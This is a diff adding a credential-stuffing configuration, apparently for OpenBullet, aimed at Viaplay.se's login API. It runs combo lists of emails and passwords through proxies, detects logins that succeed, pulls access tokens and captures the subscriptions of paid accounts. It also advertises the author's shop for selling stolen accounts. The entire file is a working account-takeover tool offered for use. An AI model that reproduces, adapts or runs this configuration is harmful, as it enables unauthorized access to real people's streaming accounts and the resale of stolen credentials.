@@ -1,0 +1,76 @@
+[SETTINGS]
+{
+  "Name": "_Viaplay.se_Faraday",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-20T12:56:32.9251112+01:00",
+  "AdditionalInfo": "Swedish combo recomended. Captures Paid accounts with list of current subscriptions. | Faraday's Account Shop: https://shoppy.gg/@msfaraday",
+  "Author": "Ms. Faraday",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://login.viaplay.se/api/login/v1?deviceKey=pcdashpr-se&returnurl=https%3A%2F%2Faccount.viaplay.se%2Fpcdash-se&username=<USER>&persistent=true" EncodeContent=TRUE 
+  CONTENT "password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: PC-DASH" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"success\":false" 
+  KEYCHAIN Success OR 
+    KEY "\"success\":true" 
+
+PARSE "<SOURCE>" JSON "accessToken" -> VAR "accessToken" 
+
+REQUEST GET "https://account.viaplay.se/" AutoRedirect=FALSE EncodeContent=TRUE 
+  
+  COOKIE "Cookie: cookie_agreement=true; accessToken=<accessToken>; hasPersistentLogin=*" 
+  HEADER "Host: account.viaplay.se" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Referer: https://viaplay.se/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" LR "n-regular-info\" class=\"widget-data\">" "</strong>" -> VAR "Psub" 
+
+PARSE "<SOURCE>" LR "s=\"entitlements-list\">" " </u" Recursive=TRUE -> VAR "Lsubs" 
+
+FUNCTION Replace "<strong>" "" "<Psub>" -> CAP "Sub" 
+
+FUNCTION Replace "<li>" "" "<Lsubs>" -> VAR "LISubs" 
+
+FUNCTION Replace "</li>" "" "<LISubs>" -> VAR "XLISubsX" 
+
+FUNCTION Replace "	" "" "<XLISubsX>" -> VAR "XLISubsX2" 
+
+FUNCTION Replace "                " "" "<XLISubsX2>" -> VAR "XLISubsX3" 
+
+FUNCTION Replace "\\n" ", " UseRegex=TRUE "<XLISubsX3>" -> CAP "Subs" 
+
+FUNCTION Constant "https://shoppy.gg/@msfaraday" -> CAP "Faraday's Account Shop" 
+
